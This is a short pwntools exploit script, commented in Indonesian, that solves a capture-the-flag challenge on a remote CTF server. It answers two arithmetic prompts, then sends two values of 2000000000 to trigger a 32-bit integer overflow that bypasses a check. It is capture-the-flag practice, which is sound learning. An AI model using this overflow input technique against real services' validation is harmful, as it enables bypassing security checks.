from pwn import *

# Setup koneksi ke server remote
host = 'tcp.sillyctf.psuccso.org'
port = 30463

io = remote(host, port)

# Jawab Pertanyaan 1: 2+2
io.sendlineafter(b"2+2?", b"4")
print("[+] Question 1 solved")

# Jawab Pertanyaan 2: 99*99
io.sendlineafter(b"99*99?", b"9801")
print("[+] Question 2 solved")

# Jawab Pertanyaan 3: Integer Overflow (x + |y| < 0)
# Kita kirim 2 miliar untuk x dan y agar hasilnya 4 miliar (overflow int32_t)
io.sendlineafter(b"Value of x:", b"2000000000")
io.sendlineafter(b"Value of y:", b"2000000000")
print("[+] Question 3 bypassed with Integer Overflow")

# Ambil semua output sisa (flag)
io.interactive()
